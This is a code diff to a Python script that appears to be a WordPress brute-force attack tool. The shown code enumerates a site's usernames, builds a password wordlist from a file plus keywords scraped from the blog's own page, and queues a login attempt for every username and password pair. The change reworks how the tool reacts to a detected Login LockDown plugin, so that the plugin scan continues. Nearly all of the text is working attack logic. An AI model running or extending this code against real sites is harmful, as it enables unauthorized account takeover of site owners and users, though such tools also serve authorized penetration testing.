@@ -67,16 +67,17 @@ if __name__ == '__main__':
         usernames.append(config.username)
 
     try:
-        if len(usernames) is 0 or wp.check_username(usernames.pop()) is False:
+        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
             logger.info("Enumerating users...")
             usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
-            if len(usernames) > 0:
-                logger.info("Usernames: %s", ", ".join(usernames))
-            else:
-                logger.error("Can't find username :(")
-                exit(0)
+
+        if len(usernames) > 0:
+            logger.info("Usernames: %s", ", ".join(usernames))
             if args.enumerateusers:
                 exit(0)
+        else:
+            logger.error("Can't find username :(")
+            exit(0)
     except urllib2.HTTPError:
         logger.error("HTTP Error on: %s", wp.get_login_url())
         exit(0)
@@ -86,11 +87,6 @@ if __name__ == '__main__':
             logger.info("Check if proxy is well configured and running")
         exit(0)
 
-    # check for Login LockDown plugin
-    logger.debug("Checking for Login LockDown plugin")
-    if wp.check_loginlockdown():
-        logger.warning("Login LockDown plugin is active, bruteforce will be useless")
-        exit(0)
 
     # tasks queue
     task_queue = Queue.Queue()
@@ -107,23 +103,28 @@ if __name__ == '__main__':
             task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
         del plugins_list
 
-    # load login check tasks into queue
-    logger.debug("Loading wordlist...")
-    wordlist = [username.strip() for username in usernames]
-    try:
-        [wordlist.append(w.strip()) for w in open(config.wordlist, "r").readlines()]
-    except IOError:
-        logger.error("Can't open '%s' the wordlist will not be used!", config.wordlist)
-    logger.debug("%s words loaded from %s", str(len(wordlist)), config.wordlist)
-    if args.nokeywords:
-        # load into wordlist additional keywords from blog main page
-        wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
-        [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
-    logger.info("%s passwords will be tested", str(len(wordlist)*len(usernames)))
-    for username in usernames:
-        for password in wordlist:
-            task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
-    del wordlist
+    # check for Login LockDown plugin and load login tasks into tasks queue
+    logger.debug("Checking for Login LockDown plugin")
+    if wp.check_loginlockdown():
+        logger.warning("Login LockDown plugin is active, bruteforce will be useless")
+    else:
+        # load login check tasks into queue
+        logger.debug("Loading wordlist...")
+        wordlist = [username.strip() for username in usernames]
+        try:
+            [wordlist.append(w.strip()) for w in open(config.wordlist, "r").readlines()]
+        except IOError:
+            logger.error("Can't open '%s' the wordlist will not be used!", config.wordlist)
+        logger.debug("%s words loaded from %s", str(len(wordlist)), config.wordlist)
+        if args.nokeywords:
+            # load into wordlist additional keywords from blog main page
+            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
+            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
+        logger.info("%s passwords will be tested", str(len(wordlist)*len(usernames)))
+        for username in usernames:
+            for password in wordlist:
+                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
+        del wordlist
 
     # start workers
     logger.info("Starting workers...")
